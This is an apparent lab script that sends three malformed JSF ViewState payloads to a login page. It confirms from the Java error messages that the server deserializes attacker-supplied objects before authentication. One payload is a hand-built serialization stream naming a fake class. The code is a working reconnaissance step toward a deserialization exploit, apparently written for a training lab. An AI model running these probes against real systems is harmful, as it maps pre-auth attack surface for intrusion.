#!/usr/bin/env python3
"""
Deserialization oracle prover for the JSF ViewState lab (see ./README.md, Step 2).

Sends three deliberately broken ViewState values to the login view and checks
that the server answers with the three distinct Java errors that prove the
decode chain  Base64 -> GZIP -> ObjectInputStream.readObject()  runs on
attacker data, during view restore, before any captcha/authentication check.

Usage:
  python3 oracle.py                # default http://localhost:8080
  python3 oracle.py http://host:port
"""

import base64
import gzip
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_TARGET = "http://localhost:8080"
LOGIN_PATH = "/pages/login.xhtml"


def login_url(target):
    return target.rstrip("/") + LOGIN_PATH


def post_viewstate(url, payload_b64):
    body = "javax.faces.ViewState=" + urllib.parse.quote(payload_b64, safe="") \
           + "&loginForm=loginForm"
    req = urllib.request.Request(
        url, data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def probe_a_garbage():
    """Probe A: not GZIP at all -> proves the GZIP decompression step runs."""
    return base64.b64encode(b"X" * 64).decode(), "Not in GZIP format"


def probe_b_truncated():
    """Probe B: GZIP wrapping a bare serialization header -> EOFException."""
    raw = gzip.compress(b"\xac\xed\x00\x05")
    return base64.b64encode(raw).decode(), "EOFException"


def probe_c_nonexistent_class():
    """Probe C: a well-formed stream naming a class that does not exist.

    Proves ObjectInputStream resolves attacker-chosen class descriptors.
    """
    name = b"com.evil.NoSuchClassXYZ"
    stream = (
        b"\xac\xed\x00\x05"            # stream magic + version
        + b"\x73"                       # TC_OBJECT
        + b"\x72"                       # TC_CLASSDESC
        + len(name).to_bytes(2, "big") + name
        + b"\x00\x00\x00\x00\x00\x00\x00\x00"   # serialVersionUID
        + b"\x02"                       # SC_SERIALIZABLE
        + b"\x00\x00"                   # 0 fields
        + b"\x78"                       # TC_ENDBLOCKDATA
        + b"\x70")                      # TC_NULL superclass
    return base64.b64encode(gzip.compress(stream)).decode(), "ClassNotFoundException: com.evil.NoSuchClassXYZ"


PROBES = [
    ("A (non-gzip garbage) ", probe_a_garbage),
    ("B (truncated stream) ", probe_b_truncated),
    ("C (nonexistent class)", probe_c_nonexistent_class),
]


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    url = login_url(target)
    print("[*] target: %s" % url)

    failures = 0
    for label, build in PROBES:
        payload, expected = build()
        status, body = post_viewstate(url, payload)
        # the leak appears HTML-escaped inside the Tomcat error page
        probe_ok = expected in body or expected.replace("&", "&amp;") in body
        restore_ok = "RestoreViewPhase" in body
        if status == 500 and probe_ok:
            print("[+] probe %s -> HTTP %s | %s" % (label, status, expected))
        else:
            failures += 1
            print("[-] probe %s -> HTTP %s | expected %r, not found"
                  % (label, status, expected))
        if probe_ok and not restore_ok:
            print("[!] warning: response did not contain RestoreViewPhase "
                  "(pre-auth claim not visible in this response)")

    if failures == 0:
        print("[+] all three probes reproduced the oracle")
        return 0
    print("[-] %d probe(s) failed" % failures)
    return 1


if __name__ == "__main__":
    sys.exit(main())
